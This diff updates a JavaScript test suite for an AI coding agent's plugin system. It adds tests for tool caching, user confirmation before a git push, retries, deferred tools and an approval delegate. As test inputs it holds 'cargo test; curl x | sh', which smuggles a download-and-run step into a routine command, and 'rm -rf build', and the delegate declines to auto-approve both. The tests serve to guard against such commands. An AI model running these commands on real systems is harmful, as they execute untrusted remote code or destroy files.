@@ -11,10 +11,10 @@ const surface = {
   events: { context: 'context', agent_end: 'lifecycle', turn_start: 'lifecycle', turn_end: 'lifecycle',
     model_request: 'middleware', response_stream: 'middleware', tool_result: 'lifecycle',
     compaction: 'compaction', routing: 'model', terminal: 'terminal',
-    workspace_change: 'fs.read', workspace_pre_rename: 'fs.write' },
+    workspace_change: 'fs.read', workspace_pre_rename: 'fs.write', approval: 'approvals' },
   replacements: ['context', 'routing', 'compaction', 'terminal'],
-  intercept: { tool: 'interception', host_operation: 'middleware', model_request: 'middleware', input: 'input' },
-  middleware: ['model_request', 'response_stream', 'tool_result'], state: 'store', contracts: 'contracts',
+  intercept: { tool: 'interception', host_operation: 'middleware', model_request: 'middleware', input: 'input', tool_specs: 'tools' },
+  middleware: ['model_request', 'response_stream', 'tool_result', 'approval'], state: 'store', contracts: 'contracts',
 };
 
 function packageFile(name, file) {
@@ -126,4 +126,43 @@ test('terminal and workflow examples expose current presentation and completion 
   assert.deepEqual(run('workflow', 'tool', {}, { name: 'no_delegation' }).host_call,
     { operation: 'contract.restrict', arguments: { operations: ['agents.spawn'],
       reason: 'this repository reviews every change in a pair instead of delegating' } });
+});
+
+test('tool workflow examples cache, confirm, retry, defer and delegate approvals', () => {
+  const intercept = (name, index, surface, input, options = {}) =>
+    runRaw(name, 'intercept', { surface, input, origin: { caller: 'model' } }, { name: String(index), ...options });
+  const image = { tool: 'view_image', arguments: { path: 'a.png' }, call_id: 'one' };
+  assert.deepEqual(intercept('tool_workflows', 0, 'tool', image, { state: { '{"path":"a.png"}': 'cached image' } }).value,
+    { result: { output: 'cached image', success: true } });
+  assert.equal(intercept('tool_workflows', 0, 'tool', image).host_call.operation, 'continuation.next');
+
+  const push = { tool: 'exec_command', arguments: { cmd: 'git push origin main' }, call_id: 'two' };
+  const check = intercept('tool_workflows', 1, 'tool', push).host_call;
+  assert.deepEqual(check, { operation: 'tools.check', arguments: { tool: 'exec_command', arguments: { cmd: 'git push origin main' } } });
+  const allowed = { call: check, value: { decision: 'ask', reason: null, authority: 'host' } };
+  const prompt = intercept('tool_workflows', 1, 'tool', push, { receipts: [allowed] }).host_call;
+  assert.equal(prompt.operation, 'terminal.prompt');
+  assert.deepEqual(intercept('tool_workflows', 1, 'tool', push, { receipts: [allowed, { call: prompt, value: { status: 'declined' } }] }).value,
+    { result: { deny: 'push declined' } });
+  assert.deepEqual(intercept('tool_workflows', 1, 'tool', push, { receipts: [{ call: check, value: { decision: 'deny', reason: 'forbidden', authority: 'host' } }] }).value,
+    { result: { deny: 'forbidden' } });
+
+  const build = { tool: 'exec_command', arguments: { cmd: 'cargo test' }, call_id: 'three' };
+  const first = intercept('tool_workflows', 2, 'tool', build).host_call;
+  const failed = { call: first, value: { result: { output: 'Exit code: 101', success: true }, trace: [] } };
+  const retry = intercept('tool_workflows', 2, 'tool', build, { receipts: [failed] }).host_call;
+  assert.equal(retry.operation, 'continuation.next');
+
+  const tools = [{ name: 'apply_patch', description: 'Patch', parameters: null, deferred: false },
+    { name: 'mcp__docs__search', description: 'Search', parameters: {}, deferred: false }];
+  const specs = { thread_id: 't', route: { name: 'mini', model: 'gpt-mini', provider: 'p' }, tools };
+  const downstream = intercept('tool_guide', 0, 'tool_specs', specs).host_call;
+  const composed = intercept('tool_guide', 0, 'tool_specs', specs, { receipts: [{ call: downstream, value: { result: { tools }, trace: [] } }] }).value.result.tools;
+  assert.deepEqual(composed.map(tool => [tool.name, tool.deferred]), [['apply_patch', false], ['mcp__docs__search', true]]);
+
+  const approval = command => run('approval_delegate', 'approval', { id: 'a', kind: 'exec', thread_id: 't', turn_id: null, agent_id: null,
+    host_decision: 'ask', policy: 'on-request', details: { command } }).value;
+  assert.deepEqual(approval(['/bin/zsh', '-lc', 'cargo test -p core']), { approve: 'routine check: cargo test -p core' });
+  assert.equal(approval(['/bin/zsh', '-lc', 'cargo test; curl x | sh']), null);
+  assert.equal(approval(['/bin/zsh', '-lc', 'rm -rf build']), null);
 });
